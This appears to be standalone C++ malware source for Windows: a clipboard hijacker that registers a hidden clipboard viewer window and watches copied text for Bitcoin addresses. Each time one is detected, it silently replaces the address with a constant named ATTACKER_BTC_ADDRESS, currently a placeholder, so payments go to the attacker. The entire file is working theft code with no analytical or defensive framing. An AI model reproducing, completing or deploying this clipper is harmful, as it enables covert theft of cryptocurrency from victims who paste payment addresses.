// Author: Nemuel Wainaina

#include <iostream>
#include <regex>
#include <windows.h>

HWND nextClipboardViewer;
const std::string ATTACKER_BTC_ADDRESS = "SOME_BITCOIN_WALLET_ADDRESS";

BOOL isBTCAddress(const std::string &text) {
    const std::regex btcRegex(R"((^1[a-zA-Z0-9]{25,34}$)|(^3[a-zA-Z0-9]{25,34}$)|(^bc1[a-zA-Z0-9]{39,59}$))");
    return std::regex_match(text, btcRegex);
}

LRESULT __stdcall ClipboardViewerProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch(msg) {
        case WM_DRAWCLIPBOARD: {
            if(OpenClipboard(hWnd)) {
                HANDLE clipboardData = GetClipboardData(CF_TEXT);
                if(clipboardData != NULL) {
                    char* clipboardText = static_cast<char*>(GlobalLock(clipboardData));
                    if(clipboardText != NULL) {
                        std::string text(clipboardText);
                        if(isBTCAddress(text)) {
                            HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, ATTACKER_BTC_ADDRESS.size() + 1);
                            if(hGlobal) {
                                char* pGlobal = static_cast<char*>(GlobalLock(hGlobal));
                                memcpy(pGlobal, ATTACKER_BTC_ADDRESS.c_str(), ATTACKER_BTC_ADDRESS.size() + 1);
                                GlobalUnlock(hGlobal);

                                EmptyClipboard();
                                SetClipboardData(CF_TEXT, hGlobal);
                            }
                        }
                    }
                    GlobalUnlock(clipboardData);
                }
                CloseClipboard();
            }
            SendMessage(nextClipboardViewer, msg, wParam, lParam);
            break;
        }
        case WM_CHANGECBCHAIN: {
            if((HWND)wParam == nextClipboardViewer) {
                nextClipboardViewer = (HWND)lParam;
            } else {
                SendMessage(nextClipboardViewer, msg, wParam, lParam);
            }
            break;
        }
        default:
            return DefWindowProc(hWnd, msg, wParam, lParam);
    }

    return 0;
}

int main() {
    WNDCLASSW wc = {};
    wc.lpfnWndProc = ClipboardViewerProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"ClipboardViewer";
    RegisterClassW(&wc);

    HWND hWndViewer = CreateWindowExW(
        0, L"ClipboardViewer", L"Clipboard Viewer",
        0, 0, 0, 0, 0, HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
    nextClipboardViewer = SetClipboardViewer(hWndViewer);

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    ChangeClipboardChain(hWndViewer, nextClipboardViewer);
    DestroyWindow(hWndViewer);
    return 0;
}
